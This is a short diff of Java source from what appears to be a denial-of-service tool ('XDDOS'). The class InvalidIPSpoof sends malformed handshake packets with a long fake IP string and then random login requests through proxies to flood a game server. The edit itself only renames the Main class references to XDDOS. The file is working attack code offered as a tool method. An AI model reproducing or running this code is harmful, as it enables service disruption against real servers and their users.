@@ -1,6 +1,6 @@
 package XD.XDDOS.methods;
 
-import XD.XDDOS.Main;
+import XD.XDDOS.XDDOS;
 import XD.XDDOS.NettyBootstrap;
 import XD.XDDOS.ProxyLoader;
 import XD.XDDOS.utils.Handshake;
@@ -50,7 +50,7 @@ public class InvalidIPSpoof
   }
   
   public void accept(Channel channel, ProxyLoader.Proxy proxy) {
-    channel.writeAndFlush(Unpooled.buffer().writeBytes((new Handshake(Main.protcolID, "1.1.1.1.1.1.1.1.1.1.1.1.1.1.1.1.1.1.1.1.1.1.1.1.1.1.1.1.1.1.1.1.1.1.1.1.1.1.1.1.1.1.1.1.1.1.1.1.1.1.1.1.1.1.1.1.1.1.1.1.1.1.1.1.1.1.1.1.1.1.1.1.1.1.1.1.1.1.1.1.1.1.1.1.1.1.1.1.1.1.1.1.1.1.1.1.1.1.1.1.1.1.1.1......\000.\000f84c6a790a4e45e0879bcd49ebd4c4e2", Main.port, 2)).getWrappedPacket()));
+    channel.writeAndFlush(Unpooled.buffer().writeBytes((new Handshake(XDDOS.protcolID, "1.1.1.1.1.1.1.1.1.1.1.1.1.1.1.1.1.1.1.1.1.1.1.1.1.1.1.1.1.1.1.1.1.1.1.1.1.1.1.1.1.1.1.1.1.1.1.1.1.1.1.1.1.1.1.1.1.1.1.1.1.1.1.1.1.1.1.1.1.1.1.1.1.1.1.1.1.1.1.1.1.1.1.1.1.1.1.1.1.1.1.1.1.1.1.1.1.1.1.1.1.1.1.1......\000.\000f84c6a790a4e45e0879bcd49ebd4c4e2", XDDOS.port, 2)).getWrappedPacket()));
     channel.writeAndFlush(Unpooled.buffer().writeBytes((new LoginRequest(randomString(14))).getWrappedPacket()));
     NettyBootstrap.integer++;
     NettyBootstrap.totalConnections++;
